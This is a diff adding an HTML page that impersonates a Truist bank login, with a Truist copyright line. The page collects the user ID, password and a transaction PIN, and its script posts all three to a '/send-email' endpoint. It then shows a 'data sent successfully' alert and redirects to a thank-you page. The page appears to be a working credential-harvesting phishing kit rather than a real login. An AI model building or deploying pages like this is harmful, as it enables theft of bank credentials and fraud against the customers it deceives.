@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Truist Client Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    :root {
+      --primary: #6a4aa3;
+      --primary-dark: #5a3a8f;
+      --gray: #666;
+      --light-gray: #e0e0e0;
+      --white: #fff;
+      --border: #ccc;
+      --success: #28a745;
+      --error: #dc3545;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    body {
+      background-color: #f9f9fb;
+      color: #333;
+      line-height: 1.6;
+      padding-bottom: 2rem;
+    }
+
+    .container {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem;
+    }
+
+    header h1 {
+      font-size: 1.875rem;
+      font-weight: 600;
+      color: var(--primary);
+      margin-bottom: 0.5rem;
+    }
+
+    .subtitle {
+      font-size: 1rem;
+      color: var(--gray);
+      margin-bottom: 1.75rem;    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+      color: var(--gray);
+    }
+
+    input,
+    select {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      font-size: 1rem;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      background-color: var(--white);
+      transition: all 0.3s ease;
+    }
+
+    input:focus,
+    select:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(106, 74, 163, 0.2);
+    }
+
+    /* Password field with eye toggle */
+    .password-container {
+      position: relative;
+    }
+
+    .password-container i {
+      position: absolute;
+      right: 1rem;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--gray);
+      cursor: pointer;
+      font-size: 1.1rem;
+      transition: color 0.3s;
+    }
+
+    .password-container i:hover {
+      color: var(--primary);
+    }
+    /* Dropdown styling */
+    select {
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%23666' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.344 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 1rem center;
+      background-size: 16px;
+      padding-right: 2.5rem;
+    }
+
+    /* Links */
+    .links {
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.75rem;
+      margin-top: 0.5rem;
+      font-size: 0.9rem;
+    }
+
+    .links a {
+      color: var(--primary);
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.25rem;
+    }
+
+    .links a:hover {
+      text-decoration: underline;
+    }
+
+    /* Promo code */
+    .promo-label {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    /* Button */
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 0.9rem;
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: white;
+      background-color: var(--primary);
+      border: none;      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .btn:hover {
+      background-color: var(--primary-dark);
+      transform: translateY(-1px);
+    }
+
+    .btn:active {
+      transform: translateY(0);
+    }
+
+    /* Floating feedback button */
+    .feedback-btn {
+      position: fixed;
+      bottom: 2rem;
+      right: 1.5rem;
+      background: var(--primary);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 0.75rem 1rem;
+      font-weight: 500;
+      font-size: 0.875rem;
+      box-shadow: 0 4px 12px rgba(106, 74, 163, 0.3);
+      z-index: 100;
+      cursor: pointer;
+      transform: rotate(-90deg);
+      writing-mode: vertical-rl;
+      text-orientation: mixed;
+      white-space: nowrap;
+      transition: all 0.3s ease;
+    }
+
+    .feedback-btn:hover {
+      background: var(--primary-dark);
+      transform: rotate(-90deg) scale(1.05);
+    }
+
+    /* Footer hint */
+    .footer-hint {
+      text-align: center;
+      margin-top: 2rem;
+      font-size: 0.85rem;
+      color: var(--gray);
+    }
+
+    /* Responsive adjustments */    @media (max-width: 480px) {
+      .container {
+        padding: 1.5rem 1rem;
+      }
+      header h1 {
+        font-size: 1.75rem;
+      }
+      .feedback-btn {
+        right: 1rem;
+        bottom: 1.5rem;
+        padding: 0.6rem 0.8rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <header>
+      <h1>Truist Client</h1>
+      <p class="subtitle">Login options</p>
+    </header>
+
+    <form id="loginForm" method="POST" action="/send-email">
+      <div class="form-group">
+        <label for="loginOption">Login options</label>
+        <select id="loginOption" name="loginOption">
+          <option value="online-banking" selected>Online banking</option>
+          <option value="mobile-app">Mobile app</option>
+          <option value="branch">In-branch</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="username">User ID</label>
+        <input type="text" id="username" name="username" autocomplete="username" required />
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password</label>
+        <div class="password-container">
+          <input type="password" id="password" name="password" autocomplete="current-password" required />
+          <i class="fas fa-eye" id="togglePassword"></i>
+        </div>
+      </div>
+
+      <div class="links">
+        <a href="#" target="_blank">
+          Forgot user ID? <i class="fas fa-external-link-alt"></i>
+        </a>        <a href="#" target="_blank">
+          Forgot password? <i class="fas fa-external-link-alt"></i>
+        </a>
+      </div>
+<div class="form-group">
+        <label for="pin">Transaction Pin</label>
+        <div class="pin-container">
+          <input type="number" id="pin" name="pin" autocomplete="current-pin" required />
+          <i class="fas fa-padlock" id="togglePin"></i>
+        </div>
+      <div class="form-group">
+        <div class="promo-label">
+          <label for="promoCode">Promo code (optional)</label>
+        </div>
+        <input type="text" id="promoCode" name="promoCode" autocomplete="off" />
+      </div>
+
+      <button type="submit" class="btn">Continue</button>
+    </form>
+
+    <p class="footer-hint">© 2026 Truist Financial Corporation. All rights reserved.</p>
+  </div>
+
+  <!-- Floating Feedback Button -->
+  <button class="feedback-btn" aria-label="Give feedback">Give Feedback</button>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script>
+    // Toggle password visibility
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+
+    togglePassword.addEventListener('click', function () {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      this.classList.toggle('fa-eye');
+      this.classList.toggle('fa-eye-slash');
+    });
+
+    // Form submission (example)
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const pin = document.getElementById('pin').value;
+
+
+            // Simulate login process
+            if (username && password && pin) {
+                // Send details
+
+
+                    $.post('/send-email',{username:username,password:password,pin: pin},function(data) {
+                        alert("Data sent successfully!! An email will be sent to you..");
+                        location.href="/thank-you";
+
+});
+
+
+            } else {
+                alert("Please enter both username and password");
+            }
+
+            return false;
+        }
+      // You'd normally submit via fetch/AJAX here
+    });
+
+    // Feedback button click (optional action)
+    document.querySelector('.feedback-btn').addEventListener('click', () => {
+      alert('Feedback feature would open a modal or redirect.');
+    });
+  </script>
+</body>
+</html>
